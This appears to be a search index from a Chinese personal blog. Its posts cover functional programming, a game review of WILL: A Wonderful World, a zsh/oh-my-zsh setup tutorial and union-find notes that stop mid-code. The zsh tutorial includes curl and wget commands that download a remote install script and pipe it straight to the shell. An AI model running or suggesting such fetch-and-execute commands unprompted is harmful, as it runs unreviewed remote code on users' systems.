machine），又称确定型图灵机，是英国数学家艾伦·图灵于1936年提出的一种抽象计算模型，其更抽象的意义为一种数学逻辑机，可以看作等价于任何有限逻辑数学过程的终极强大逻辑机器。 图灵的基本思想是用机器来模拟人们用纸笔进行数学运算的过程，他把这样的过程看作下列两种简单的动作： 在纸上写上或擦除某个符号； 把注意力从纸的一个位置移动到另一个位置； 为了模拟人的这种运算过程，图灵构造出一台假想的机器，该机器由以下几个部分组成： 一条无限长的纸带TAPE。纸带被划分为一个接一个的小格子，每个格子上包含一个来自有限字母表的符号，字母表中有一个特殊的符号表示空白。纸带上的格子从左到右依次被编号为0, 1, 2, …，纸带的右端可以无限伸展。 一个读写头HEAD。该读写头可以在纸带上左右移动，它能读出当前所指的格子上的符号，并能改变当前格子上的符号。 一套控制规则TABLE。它根据当前机器所处的状态以及当前读写头所指的格子上的符号来确定读写头下一步的动作，并改变状态寄存器的值，令机器进入一个新的状态。 一个状态寄存器。它用来保存图灵机当前所处的状态。图灵机的所有可能状态的数目是有限的，并且有一个特殊的状态，称为停机状态。 注意这个机器的每一部分都是有限的，但它有一个潜在的无限长的纸带，因此这种机器只是一个理想的设备。图灵认为这样的一台机器就能模拟人类所能进行的任何计算过程。 上面这一段来自维基百科。其实，说了这么多，我们可以知道，图灵机所描述的是这么一个机器：有一条纸带和一系列规则，我们根据规则读写和修改纸带上的数据。 根据图灵机，从Fortran开始，然后是Algol 60，慢慢发展到现在经久不衰的C语言等等。这一类语言我们叫做命令式语言，它们最大的特点就是描述状态的改变。 什么叫状态的改变？考虑一种最常见的数据结构，数组。假如说，我们有一个字符串，要多次修改它，我们应该怎么办？很简单，使用数组存储，然后找出对应部分进行修改。那我们把这一过程如下抽象： 定义字符串$s$，其中$s[i]​$意味着访问第$i​$个元素 那当我们定义出来一个字符串之后，我们执行如下操作： 读入原字符$p$以及需要修改成的目标字符$q$。 遍历字符串，若$s[i]=p$，则修改$s[i]$为$q$。 循环以上过程$k$次之后，我们得到最终的字符串$s’$。 那我问一个问题，$s’=s$成立吗？ 几乎是一瞬间就能知道成立。因为我们每次都是在修改$s$，实际上的$s’$就是$s$基础上修改得到，所以$s’$和$s$就是一个字符串。 那你看，我们每一次就是把这个字符串$s$从一个状态转换到另一个状态，并在多次转换后得到最终状态$s’$。 这就是命令式编程。那么，函数式呢？ ","date":"2017-09-14","objectID":"/post/b0ce9bee/:2:1","tags":["FP","函数式编程","Functional Programming","技术"],"title":"函数式编程——Think differently（1）","uri":"/post/b0ce9bee/"},{"categories":["技术笔记"],"content":"ii. 函数式编程 我们先来想一个东西。考虑如下函数应用过程： $$ y = f(x) = x + 5 $$ 当我们输入$x=7$，得到$y=f(5)=12$。在这个过程中考虑如下问题： $x$发生了什么变化？ 很直观就能看出，$x$并没有发生任何变化。 这是数学函数应用的两个重要特点：没有副作用和一一对应。所谓副作用，也就是说，不会产生外部影响，并不会因为我输入$x=2012$而引发世界毁灭。一一对应的意思是，无论在任何情况下，只要我输入$x=2012$，$y$就一定是$2017$，不会有任何变动。 那所谓函数式编程，就是在这种思想下诞生的。 什么是函数式编程呢？ 函数式编程（英语：functional programming）或称函数程序设计，又称泛函编程，是一种程序设计典范，它将电脑运算视为数学上的函数计算，并且避免使用程序状态以及易变物件。 函数式语言最重要的基础是λ演算（lambda演算），而λ演算的函数可以接受函数当作输入（引数）和输出（传出值）。 比起命令式程式设计，函数式程序设计更加强调程序的执行结果而非执行的过程，倡导利用若干简单的执行单元让计算结果不断渐进，逐层推导复杂的运算，而不是设计一个复杂的执行过程。 你看，是不是明朗的多？其实很简单，我们可以这么考虑，还是利用上面的例子： 定义字符串$s$，其中$s[i]$意味着访问第$i$个元素 现在我们定义一个函数： $f(s)=s_a$，其中，$s[i]=p$且$s_a[i]=q$。 那上面的过程我们可以如下描述： 读入原字符$p​$以及需要修改成的目标字符$q​$。 对字符串$s$应用函数$f(s)$，使用一个新字符串$s_a$接收当前结果并留作后用 那循环上述过程$k$次，可得到如下表达式： $$ s_k=f(f(…f(s)…)) $$ 那这里有一个问题，$s_k=s$成立吗？ 从上面的讨论大家就知道，函数不会修改输入，每一次我们都是拿一个全新的字符串去接收应用结果，所以$s_k\\ne s$。 那第二个问题很好解答，这么一个应用过程之后，我们产生了多少个新字符串？ $k$个，相信不用我再过多介绍了。 这就是函数式编程了。我们永远不修改输入，而是不断地对输出应用函数。 ","date":"2017-09-14","objectID":"/post/b0ce9bee/:2:2","tags":["FP","函数式编程","Functional Programming","技术"],"title":"函数式编程——Think differently（1）","uri":"/post/b0ce9bee/"},{"categories":["技术笔记"],"content":"iii. 开头代码 那现在可以解释开头的代码了： // Example 1: Recursion, Functional int sum(int n) { if (n == 1) return 1; else return n + sum(n - 1); } 你看，对于这段代码来说，我们没有修改n，而是把n - 1作为参数传到下一个函数中，最后把所有函数的结果加起来。这其中没有任何变量修改。 而第二段： // Example 2: Loop, Imperative int sum(int n) { int res = 0; for (int i = 1; i \u003c= n; i++) res += i; return res; } 我们用了一个变量res，每次都修改res的值，最后得到我们的结果。 ","date":"2017-09-14","objectID":"/post/b0ce9bee/:2:3","tags":["FP","函数式编程","Functional Programming","技术"],"title":"函数式编程——Think differently（1）","uri":"/post/b0ce9bee/"},{"categories":["技术笔记"],"content":"下期预告 到现在，函数式和命令式的区别讲清楚了。 不过，这两段代码还能用好几节，为什么函数式我用了递归，而命令式用了循环呢？ 另外，函数式这么神奇，是哪个大佬起了决定性作用？ 函数式又解决了什么问题呢？ 敬请期待下一期：邱奇和Lambda演算。 Changelog: 2017.9.16, V1.1: 修复排版错误，更换例子，修复示例代码 ","date":"2017-09-14","objectID":"/post/b0ce9bee/:3:0","tags":["FP","函数式编程","Functional Programming","技术"],"title":"函数式编程——Think differently（1）","uri":"/post/b0ce9bee/"},{"categories":["博客记录"],"content":"好久没写博客了。 这三个月可以说经历了一些东西，看了很多，也想了很多，可能是更迷茫也可能是对未来更清晰了。 之后会写点文章的。 先说点正事。 网易云跟帖也倒了，很奇怪，为什么大家接二连三的倒了，先是多说，后是网易云跟帖。 由于我这个菜鸡不会前端，暂时没动力换成畅言，现在主题支持的比较好的就是Livere了，先换成Livere吧。 其实也没人评论，正如一个博客所说的那样，优秀的评论少之又少，况且我的博客没人看也没人写评论（笑 那就先这样吧，如果想说什么，请不吝赐教！ ","date":"2017-09-14","objectID":"/post/2b6bf502/:0:0","tags":["评论系统","博客记录"],"title":"再换评论系统","uri":"/post/2b6bf502/"},{"categories":["游戏和漫画"],"content":" 用你的睿智和聪敏，帮助那些期盼着你的人们吧。 WILL：美好世界 2015年，这个游戏登上摩点众筹的时候，我就被这种玩法深深地吸引了。熟悉AVG的朋友一定都听说过大名鼎鼎的《428:被封锁的涩谷》，这款游戏和428十分像，人与人之间的命运是相连的，A的行为往往能影响到B，进而产生更大的连锁反应。 2015年正值高二，我记下了这个名字便投入到紧张的学习中。两年过后，我无意中在奶牛关的首页看到了它，再三确认下，《WILL：美好世界》发售了。于是我便在这个死亡周，有一车东西要做的情况下投入到紧张刺激的游戏当中，两天断断续续的游玩加一个通宵过后，全成就通关了，之后找时间再做全结局回收吧。 游戏结束了，我却久久不能忘怀，似乎是看到了一丝曙光。是时候写篇评测了。 注：本文后半段会涉及剧透，我会标明，就这样。 游戏 Logo ","date":"2017-06-10","objectID":"/post/ebdf3c66/:0:0","tags":["游戏","美好世界","Steam","AVG","推荐"],"title":"WILL: A Wonderful World","uri":"/post/ebdf3c66/"},{"categories":["游戏和漫画"],"content":"1.简介 游戏Steam购买地址：here 游戏制作组官方淘宝店：here（之前参与过摩点众筹的记得看这里领5元抵用券！） 目前游戏售价：普通版￥60，OST￥31，豪华版限时（-15%）￥77/￥75 大约通关时间：9~12小时。 全成就难度：低~中 ","date":"2017-06-10","objectID":"/post/ebdf3c66/:1:0","tags":["游戏","美好世界","Steam","AVG","推荐"],"title":"WILL: A Wonderful World","uri":"/post/ebdf3c66/"},{"categories":["游戏和漫画"],"content":"2.系统与操作 本作的系统十分简单易懂，玩家只需要收信、读信，改变信件中语句的顺序，就可以改变事件走向；后期在事件中会有冲突，比如两件事情之间存在互斥性，同时只能发生一个；也有事件存在先后顺序，比如先上子弹才能开枪等等，总体来说，这一部分是比较简单的。 之后的系统是时空影响。很多事情的发生是有前置条件的，比如假如你没有去日本，那么你就不可能发生日本有关剧情，游戏中很多内容都需要前置条件影响，或者说的再通俗一点，就是之前事件的结局。游戏中的时空影响有多种，有的剧情会明确给出提示，比如会有虚线和灰框，那么明显就是有什么条件没有达成，玩家倒推就能返回去去把前置条件启动，然后对应的路线就可以走了；另一种是支线结局，在这里就不过多剧透了，对于支线结局一般就是要达成某些条件，才会有支线结局的路线，然后就能正常的做下去。 第三个就是解谜，游戏实际上没有太多谜题需要我们去解决，这其中部分谜题就排列组合就行，而剩下部分则有点难度，先自己思考，这里我给出三个提示： 关于摩尔斯电码，要注意给出的是详细地址，不只是楼层信息关于两兄弟巡逻，有时候原路返回也是不错的方法。关于钥匙链密码，看沙滩裤与白衬衫的信纸 整个系统就是这三大块，我们只需要读信并重排来信语段触发故事即可，不管是前置条件还是谜题都是为了促进故事的一环。剧情进展到中后期就会有没有来信的情况，遇到这种情况就先去打其他路线，直到这些路线打通了、完善了，就自然会收到新的来信。同时要注意，整个剧情关联性其实比较强，所以推荐不要每次打出S就往下走，多打几个，整个故事会渐渐明朗。 不过要注意到的两个缺点，一个是在中盘开始才可以自由切换当前路线结局，之前都必须手动重打启动结局；第二个就是剧情关联性有点牵强，导致某些地方就是强制排列组合，而且有些时候中间什么都没发生，就是所有语段都挪走了也是种结局，根本上就是一种不断试错的过程，有点枯燥。 至于操作上，本游戏十分依赖鼠标，键盘就一个A启动自动模式，空格相当于鼠标左键，往下发展故事，操作还是有很多欠缺的地方。 ","date":"2017-06-10","objectID":"/post/ebdf3c66/:2:0","tags":["游戏","美好世界","Steam","AVG","推荐"],"title":"WILL: A Wonderful World","uri":"/post/ebdf3c66/"},{"categories":["游戏和漫画"],"content":"3.音乐和CG 音乐和CG实际上诚意十足。 音乐方面，创作团队原创了6曲，这六首歌都在OST里面给出了，如果买了就可以听，还挺好听的，尤其是《Chains》，三个版本都有听的价值。而其他的配乐都是创作团队购买的，在https://www.shockwave-sound.com/和https://www.soundsnap.com/两个平台买的，有很多好听的曲子。不过用Unity写的游戏大家都懂的。 CG的质量中等偏上， 毕竟不是几位画师跟到底，而是有很多人，一人一两张的负责方法，所以同线的不同CG可能还是略微有违和感，但是整体质量不低，收集也没有太大难度，只要触发对应结局就能获得。这里要注意的是，不是所有CG都是S结局下有的。 ","date":"2017-06-10","objectID":"/post/ebdf3c66/:3:0","tags":["游戏","美好世界","Steam","AVG","推荐"],"title":"WILL: A Wonderful World","uri":"/post/ebdf3c66/"},{"categories":["游戏和漫画"],"content":"4.剧情 剧透警告 我已经警告过你了。 一款AVG，无论系统怎么走向，我们一定要谈的就是剧本，剧本是一款AVG的灵魂，可以说再好的系统配上烂剧本那也就是一个废品。而如果满分是5分，WILL我能给到3.5分。 首先来说，WILL的剧情不是架空的，虽然有幻想的成分，但是每个部分不会存在很大的漏洞，基本都能说通，最后的时空诡计我聊不动，这个东西还是让物理学大佬来考证说法的漏洞，这里是没有太大问题的。 下面我们谈一个核心——黑色盒子。黑色盒子很明显，装下了WILL两台机器。在我印象中，这两台机器分别出现在以下场景：刑侦四组、阿莉西亚的任务，以及大黄最后S结局。当然，这个黑色盒子应该出现在更多地方，但是这里有一个问题，就是这些地方即使后面揭秘了，仍然看不出来黑色盒子和这些场景有什么关联。 这个黑色盒子暴露出来的就是整个故事最大的问题：没有收束点。整个故事我们可以看到，安排和很多共性，比如最后那场大雪，我们都可以猜出来应该是兄妹二人遭遇车祸被改写，全球在夏天下雪，但是也就这么戛然而止了，跟黑色盒子一样，看不出来有什么存在的意义。 其次，这个收束点还在每个人身上。当我们打完之后，我们可以发现，每条线之间联系似乎密切却似乎又无影响，师生恋这条线似乎就是为了提出基仔，而基仔是推动Pi，最后Pi参与了很多纷争，结局却又是完结在大黄身上。你看，这么混乱的结局，实际上每一条线都是有理有据，但是人物间的这么多关系，却对整个大局没有影响——基仔完了就完了，师生恋完了就完了，卡洛斯完了就完了，也就是说，这么多线导出来的结局是相互独立的，而且和最后的真结局没有更大的联系，这一点实在是缺失了。我们能看到类似的游戏中，《街》和《428》最后所有人都能收束到一个点上，于是他们所有的行为都能讲得通，所有的结局似乎都是为了导出真结局而努力，而在《WILL》中，我们只是为了凑齐结局，然后进行最后一环而努力。希望之后的DLC能够对剧本再做延伸，提出一个完整的收束点，那么这个剧本就变得更棒了。 这里按理说是一个很大的漏洞，但是我只想扣一分。因为王妙一笔下，每一个人个性十足，我们能感受到卡洛斯那种得过且过但是纯真善良的感觉，也能体会到李雯一次次心境变化，甚至会不由自主的去尝试阿莉西亚多种结局，体验一个黑户在香港的人生多样，最终将她导向一个不是真正的最好，却是在这层层因果下，她人生的最好结局上。同时，CG的出现也十分巧妙，包括李雯泥石流下的哭脸，姜白夜抓住护士手再多抽一点的急切，真的感觉我就是在这个医院，看到了这种热血沸腾的画面。 剧本其实还有一点问题，比如石头这条线似乎并没有太大必要，不如转过去描写林兆辉，这个角色在香港线里面也是有很重要位置的。这里再扣0.5分吧。 总之，剧本虽然没有说十分优秀，却也不会让你失望，至少玩下去，也有一股意犹未尽的感觉。 ","date":"2017-06-10","objectID":"/post/ebdf3c66/:4:0","tags":["游戏","美好世界","Steam","AVG","推荐"],"title":"WILL: A Wonderful World","uri":"/post/ebdf3c66/"},{"categories":["游戏和漫画"],"content":"5.总结 我是很庆幸的。 这些年，中国涌现出太多的独立游戏，或者说跟着这股浪潮，有好有坏，前有出色的Galgame《高考恋爱一百天》，后面《地球OL》和《幻》让玩家气得跳脚，而隔壁，仙剑七连视频都没放出来就开始画饼了。 自从游戏机禁令解除，似乎多少小时候有一股电玩梦想的开发者一夜之间站起来了，也不知道中间混迹着多少对游戏什么都不懂，就想赚一波就跑的资本家，或者用爱发电，成天画饼，妄想几个人挑战3A的跳梁小丑。 最棒的是，王妙一和她的团队，不是这二者中的任何一个，而是真正在做游戏的。 做一个游戏有多辛苦众所周知，何况是在这种快餐文化盛行的当下，做一个需要耐心才能玩下的AVG，这背后的努力不言而喻。我们能看到的是，参加了两届TGS，《美好世界》并没有把这些成天挂在嘴边，而是踏踏实实做了点东西。 我还记得那些年玩《逆转裁判》和《幽灵诡计》，玩《Ever17》和《428：被封锁的涩谷》的时候，一直感叹，日本人写故事怎么就他妈的这么强；而后面玩Telltale家作品的时候，觉得美国人讲故事也是有点味道的。中国五千年文化，从来不缺优秀的剧本，为什么诞生不出这样的游戏？ 但是，至少在今年，我看到了一丝曙光。中国还有人在做AVG，在用心做AVG，在真正把游戏当事业，当艺术去做。这个剧本并不是十分完美的，有问题，有缺陷，但是这里面还有一样东西，让我们会心一笑： 真心。 是啊，正是这一份隐藏在剧本后面的真心，让我们废寝忘食的打下去，让我们能够挂在嘴边，让我们能够自豪的说上一句：”我们中国也有好玩的剧情游戏！“。 瑕不掩瑜，如果要说今年的十佳游戏，肯定有《WILL：美好世界》。 我是很庆幸的，中国还有真正做游戏的人。这便是我们玩家最幸福的时刻了。 也希望这道光，能一口气照亮整个2017。 全成就 那就这样吧，希望你也能来一窥，这美好的世界。 ","date":"2017-06-10","objectID":"/post/ebdf3c66/:5:0","tags":["游戏","美好世界","Steam","AVG","推荐"],"title":"WILL: A Wonderful World","uri":"/post/ebdf3c66/"},{"categories":["Linux"],"content":"Linux下接触最多的就是Shell了，之前一直用默认的bash，虽然早就听说过zsh，但是大家都知道的，懒。 今天看阮老师博客的时候看到他介绍fish shell，评论刚好有人提到zsh，我想了一下今晚没多少事就搞了一波，现在我已经zsh上瘾了，无法再回到bash了！ 上一张我现在的shell截图： Shell 就写一篇简单的教程怎么定制zsh吧！ 注：Windows用户就别看了，我的环境是Elementary v0.4， 基于Ubuntu 16.04. ","date":"2017-05-15","objectID":"/post/517fc966/:0:0","tags":["Linux","zsh","oh-my-zsh"],"title":"oh my zsh!!!","uri":"/post/517fc966/"},{"categories":["Linux"],"content":"1.安装 安装十分简单。 sudo apt update \u0026\u0026 sudo apt install zsh -y 装好zsh后还没完。zsh能展示出很强的效果，但是配置极其麻烦，导致没什么人用。后面Robby Russell这哥们坐不住了，写了oh-my-zsh来帮大家快速上手zsh，这一做不要紧，zsh直接名声远扬了！所以我们肯定得装一波！ 使用curl： sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 当然了，wget也行： sh -c \"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" 跑完就装好了，输入zsh进入zsh环境，然后输入exit退出到bash。 ","date":"2017-05-15","objectID":"/post/517fc966/:1:0","tags":["Linux","zsh","oh-my-zsh"],"title":"oh my zsh!!!","uri":"/post/517fc966/"},{"categories":["Linux"],"content":"2.主题配置 zsh有许多十分漂亮的主题，选哪个呢？简单，改一下配置文件。配置文件在~/.zshrc，用文本编辑器打开改这行： ZSH_THEME=\"robbyrussell\" 改成random就行，然后关了再开，就可以看到随机切换的主题啦！如果有哪个是你喜欢的，看第一行会告诉你载入了哪个主题，比如xxx.zsh-theme，把random替换成xxx就行。 我选择了agnoster，虽然很漂亮但是有两个小问题： 终端显示乱码。看了一下官方文档，我缺字体了。直接跑这一串命令： # clone git clone https://github.com/powerline/fonts.git # install cd fonts ./install.sh # clean-up a bit cd .. rm -rf fonts 然后到终端设置把字体换成对应后面有Powerline字样的即可，比如我的是Roboto Mono for Powerline。 时间显示 有些主题有时间显示，真的实用，但是agnoster默认没有，就很气。但是大家都是写代码的，临时照猫画虎实在是太简单了。我翻了几个其他主题的文件，然后就直接改了： 首先复制一份： cp ~/.oh-my-zsh/themes/agnoster.zsh-theme ~/.oh-my-zsh/themes/agnoster-ramen.zsh-theme 我看了一下这个主题的结构，首先加了显示时间的函数： prompt_time(){ prompt_segment green black \"%D{%m-%d %I:%M:%S}\" } 然后在显示阶段改了一下优先级： build_prompt() { RETVAL=$? prompt_status prompt_virtualenv prompt_time #加上这行，在显示用户名和主机名前面显示时间 prompt_context prompt_dir prompt_git prompt_bzr prompt_hg prompt_end } 主题就魔改完了，重启生效。 ","date":"2017-05-15","objectID":"/post/517fc966/:2:0","tags":["Linux","zsh","oh-my-zsh"],"title":"oh my zsh!!!","uri":"/post/517fc966/"},{"categories":["Linux"],"content":"3.插件配置 zsh还有一个特别强大的地方，就是插件。 配置插件很简单，还是自己的配置文件，找到这一行： plugins=() 往括号里面加上插件名字就行，空格分隔。 我选择了如下插件： git 默认开启的插件，提供了很多快捷指令，比如glog是git log，gf是git fetch等等，很实用。 autojump 这个插件需要配合，先装上autojump： sudo apt install autojump -y 然后重启zsh就能用了。怎么用呢，比如说你从/home/study切换到了/etc/nginx/site-available然后又切换到了~/.oh-my-zsh/，你现在想回去/home/study，只需要： j study 你就回去了！这个插件会寻找你之前所有访问过的路径然后模糊匹配到最接近的一项。这样在多个目录之间跳转就很快很方便。 zsh-syntax-highlighting 这个插件更是实用，它可以帮你自动检测你的语法是否正确，正确的命令显示为黄色，不正确的显示为红色，正确的路径会带有下划线，错误的就没有，十分舒畅，保证自己每次输入都是正确的！ 这个插件需要手动安装，也不难： cd ~/.oh-my-zsh/plugins/ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git 就可以启用了。 nvm 这个就不说了，我的博客依赖于node.js，然后我是用nvm装的，结果这东西的环境变量有问题，这个插件完美的解决了这个问题（我还绕了不少弯路） extract 这个插件就如名字所说，是一个解压的插件。解压有什么难的？那么你告诉我.tar和.tar.gz和.tar.bz2和…………的解压命令都是什么参数。 这个东西的出现就完美解决了这种背参数的情况，无论是.tar.xxx，还是.zip，只需要 x \u003cfilename\u003e 就解压成功了，轻松随意！ gitignore 常用git的都知道，总有很多文件，像编译器的项目配置啊，测试文件啊不需要也不应该上传到git版本库里，然后就得写.gitignore文件，手写很烦，http://gitignore.io帮我们解决了这个问题，我们只需要进去填上我们的编辑器/编译器、所使用的语言、开发的平台就能帮我们生成一个.gitignore文件。但是每次开浏览器太麻烦了，所以诞生了这个插件。这个插件就是直接把参数传到这个网站然后返回文件内容，但是用起来真的舒爽： gi linux c++ visualstudiocode \u003e .gitignore 结束了，我们开始开发就行了。 总而言之，这些插件的出现都是为了方便我们的开发，你也可以选择更多你喜欢的插件，这里是官方的插件目录，找你熟悉的吧！像Python的lint工具autopep8等都有对应的插件，你一定能配置好你自己独一无二的zsh！ 另外，插件在于精不在于多，多了拖慢启动速度，选择那些你经常使用而且的确有很大实用价值的插件就可以了。 ","date":"2017-05-15","objectID":"/post/517fc966/:3:0","tags":["Linux","zsh","oh-my-zsh"],"title":"oh my zsh!!!","uri":"/post/517fc966/"},{"categories":["Linux"],"content":"4.其他配置 zsh还有很多其他配置，我就简单说一下alias的使用。 进入配置文件，加上这么一行： alias zshconf=\"vim ~/.zshrc\" 这条命令说的是，把zshconf创建为vim ~/.zshrc的别名。保存重启后，当我需要改配置文件的时候，直接打zshconf就行，再也不用vim ~/.zshrc了～ 完了吗？没有，zsh包括alias在内还有很多奇妙的玩法，看这里学习吧！ ","date":"2017-05-15","objectID":"/post/517fc966/:3:1","tags":["Linux","zsh","oh-my-zsh"],"title":"oh my zsh!!!","uri":"/post/517fc966/"},{"categories":["Linux"],"content":"5.切换为默认终端 配置了这么多，每次都要zsh切换进去实在是太麻烦了，zsh已经被我们改造的可以日常使用了，怎么换成默认终端呢？ 首先看一下你的zsh安装目录： cat /etc/shells 找到诸如xxx/zsh的目录，比如/bin/zsh。 然后运行 chsh 跟着提示做就行了。弄完后重启终端模拟器，你的默认shell就变成zsh了！ 结果配置了这么多三个小时过去了，也没复习也没干活，一句话总结： 摸！ 大家下篇文章见了～ ","date":"2017-05-15","objectID":"/post/517fc966/:4:0","tags":["Linux","zsh","oh-my-zsh"],"title":"oh my zsh!!!","uri":"/post/517fc966/"},{"categories":["算法笔记"],"content":"这个系列自从出了个预告，然后就什么都没有了。 哎，这段时间好划啊，什么都没研究进去，只能吃吃老本了。 最近也是忙的要死，什么技术性文章都没写，是时候动笔了。 （DDM会复活的，相信我！！！ 对了，这篇文章开始结构要发生改变，预告里面那个结构太智障不实用了。 ","date":"2017-05-13","objectID":"/post/8ecb99c8/:0:0","tags":["算法","ACM-ICPC","并查集","技术","C++"],"title":"Ramen的算法笔记.1","uri":"/post/8ecb99c8/"},{"categories":["算法笔记"],"content":"Ramen的算法笔记.1 并查集 什么是并查集？说这个问题前，我们先想一个情景： 我有100位好朋友，现在我要举办一场Party！Whoo！ 在我的这些朋友中，有一些人相互认识，比如A认识C，C又认识E，然后W认识X…… 认识的人坐一起那当然更爽了！比如A、C、E坐一桌，W和X坐一桌…… 现在我想问你，我最少需要多少张桌子？ 怎么样，是否有点清晰了？并查集解决的就是这样的问题。 简单来说，就是把相似的划分进一组，最后问问你有几组的问题。 这个问题我们可以想象网络，每两台的连接起来的机器分进一组，那么我们很容易就能计算出当前有多少组机器互联了，假如我们新增加一组机器可以让三组互联，那么让它们全部互联还需要加机组机器这样的问题。存储这种关系并返回查询结果的数据结构就是并查集了。 ","date":"2017-05-13","objectID":"/post/8ecb99c8/:1:0","tags":["算法","ACM-ICPC","并查集","技术","C++"],"title":"Ramen的算法笔记.1","uri":"/post/8ecb99c8/"},{"categories":["算法笔记"],"content":"1.定义与API 1.1定义 并查集，Union-Find Set，也叫用于不相交集合的数据结构，Disjoint-Set Data Structure。 在计算机科学中，并查集是一种树型的数据结构，其保持着用于处理一些不相交集合（Disjoint Sets）的合并及查询问题。有一个联合-查找算法（union-find algorithm）定义了两个操作用于此数据结构。 ​ ——维基百科 那么并查集的最终用途，就是用于对一组不相交集合进行合并操作，并从此查询，获得关于元素的信息。在这个过程中，我们把元素抽象为一个个触点，而每一个集合里面的元素都是联通的，所联通的两个触点间的路径被我们称为联通分量。 显然，我们把集合抽象为了一个无向图。 这是一个用树去处理图的数据结构。想到什么了吗？对，最小生成树。我们会在最小生成树这一节用到并查集。 1.2 API 下面是并查集的API接口。 接口的描述形式采用《算法（第4版）》的形式。（橙书好橙书棒，橙书你买不了吃亏买不了上当～ class UF 返回值 API 解释 UF(int n) 构造一个有n个触点的并查集 ~UF() 析构此并查集 void Union(int p, int q) 添加触点p到触点q的联通分量 int find(int p) 返回触点p的所在分量的标识符（代表元素、根触点） bool connected(int p, int q) 查询是否触点p与触点q在一个联通分量里面 int getCount() 返回联通分量的数量 ","date":"2017-05-13","objectID":"/post/8ecb99c8/:1:1","tags":["算法","ACM-ICPC","并查集","技术","C++"],"title":"Ramen的算法笔记.1","uri":"/post/8ecb99c8/"},{"categories":["算法笔记"],"content":"2.算法细节 从API定义我们能看到，并查集所实现的操作十分简单，而且极为清晰。 首先我们来想，怎么存这个图。很显而易见的是，这个图没有权值（也可以说权值均为1），所以我们并不需要邻接矩阵或者邻接链表。这里一维数组就足够解决一切问题。显而易见的是，联通分量最初为n个，因为没有任何触点此时是联通的。 接下来的问题是，怎么表示两个触点在一个联通分量里面？ 第一种做法很简单，如果二者在同一个联通分量里面，说明二者具有相同的性质，那就让这二者都指向其中一个就行了，比如1和8在一个联通分量里面，那么1和8的数组数据要么都是1要么都是8不就结束了？ 这种方法我们能证明在$O(1)$的时间内就能把两个触点添加到同一个联通分量里面。但是我们要查询呢？很显然，很麻烦，最坏的情况是，查询其中一个元素遍历了$n/2$的数组，而另一个元素也需要遍历$n/2$次数组，这样算法复杂度很大。进一步研究表示，假如我们添加了所有联通分量，也就是最后只剩一个联通分量，那我们最终需要访问$(N+3)(N-1)$次数组，也就是$O(N^2)$的复杂度。现实生活中这样的算法实际上无法使用，因为并查集一般需要处理的问题大概在百万级别，这样的复杂度实在是太高了。 第二种做法就显得复杂但是速度更快。我们这么想，一开始我们让所有触点指向自己，也就是说所有触点的根触点是它们自己。之后我们归并两个触点的时候，我们只需要让它们指向同一个根触点就行。 举例来说，一开始是1和8，那么我们让1仍旧指向自身，然后让8指向1。后来我们又需要添加8和3，那么只需要让3也指向1，此时我们查询8和3，能查到这二者根触点是一个，这二者就在一个联通分量里面。此时根触点就是分量的标识符。 眼熟吗？对，这就是一棵树。 弄懂了这里，我们就可以开始考虑实现了。 ","date":"2017-05-13","objectID":"/post/8ecb99c8/:1:2","tags":["算法","ACM-ICPC","并查集","技术","C++"],"title":"Ramen的算法笔记.1","uri":"/post/8ecb99c8/"},{"categories":["算法笔记"],"content":"3.实现 实现阶段，我们有以下问题需要考虑。 多少个触点？ 我们一共有n个触点，所以我们需要一个n大小的数组。动态内存分配即可。 int *id = new int[n]; 这个时候要注意析构： delete[] id; 初始化？ 初始化让所有触点指向自己即可： for (int i = 0; i \u003c N; i++) id[i] = i; 怎么查找？ 由上面的讨论我们知道，到后面会出现树挂到根触点的情况，所以我们不能只是简单找到一个点就结束了。根据我们的讨论，我们知道一个循环即可，退出条件是触点指向自己。 int find(int p) { while (p != id[p]) p = id[p]; return p; } 归并操作？ 归并操作就简单许多，我们让其指向一个统一的根触点即可。 void Union(int p, int q) { int pRoot = find(p); int qRoot = find(q); if (pRoot == qRoot) return; id[pRoot] = qRoot; // id[qRoot] = pRoot is valid too. count--; } 这些问题解决了，实现起来就简单了，下面是完整实现： class UF { public: UF(int n) { count = length = n; id = new int[n]; for (int i = 0; i \u003c length; i++) id[i] = i; } ~UF() { delete[] id; } int getCount() { return count; } bool connected(int p, int q) { return find(p) == find(q); } int find(int p) { while (p != id[p]) p = id[p]; return p; } void Union(int p, int q) { int pRoot = find(p); int qRoot = find(q); if (pRoot == qRoot) return; id[pRoot] = qRoot; count--; } private: int count; int *id; int length; }; ","date":"2017-05-13","objectID":"/post/8ecb99c8/:1:3","tags":["算法","ACM-ICPC","并查集","技术","C++"],"title":"Ramen的算法笔记.1","uri":"/post/8ecb99c8/"},{"categories":["算法笔记"],"content":"4.优化 优化这个板块可能出现可能不出现，取决于怎么讲和这个数据结构有没有优化。 这个算法比起上一个要快，至少在平均状况下。但是在最复杂的情况下，它的复杂度仍然能到达$O(N^2)$。这是因为当这个树是一棵单边树，也就是所有节点都连接在同一侧的时候，我们的整个寻找过程跟第一种情况一样。 那么我们怎么优化呢？再优化存储结构行不通了，接下来让我们分别看看合并和查询操作。 4.1合并操作的优化——按秩合并 首先解决一个问题，什么是秩？我们可以简单的理解为树的深度。按秩合并是一种什么优化呢？我们考察这个例子： 你会怎么合并？ 根据刚才的讨论，我们应该尽量减少树的深度，所以显而易见的是，我们应该把第二棵树链接到第一棵树上。 4.2查询操作的优化——路径压缩 继续考虑第一张图： 想一个问题：当我们查询4的时候，我们最终肯定要查询到根触点1。这也就是说，4这个联通分量的标识符就是1。那么我们能不能这么做，直接把4挂到1下面，不用再经过3和2？当然可以！本着“前人栽树后人乘凉”的原则，这个操作就让查询来实现——也就是说，当我们查询一个节点的时候，我们索性把一条路都挂到根触点上。这样操作之后，图一就变成如下这个样子： 最理想的情况下，这棵树的深度就是2，一个根触点连接了所有触点。 4.3实现 代码实现起来就很简单了： 按秩合并 首先，我们需要新建一个表示秩的数组并将其全部初始化为1： int *sz = new int[n]; for(int i = 0; i \u003c n; i++) sz[i] = 1; 当然，析构也需要这一句： delete[] sz; 其次，在合并过程中，我们需要如下判断： if (sz[pRoot] \u003c sz[qRoot]) { id[pRoot] = qRoot; sz[qRoot] += sz[pRoot]; } else { id[qRoot] = pRoot; sz[pRoot] += sz[qRoot]; } 这就完成啦！ 这里我们做了一层判断，如果左树深度小于右树，就把左树挂到右树上并更新秩，否则就反过来。 路径压缩 路径压缩只需要在查询操作中添加两个辅助暂存变量并再度遍历即可： int k = p, j; /* Original Code */ while (k != p) { 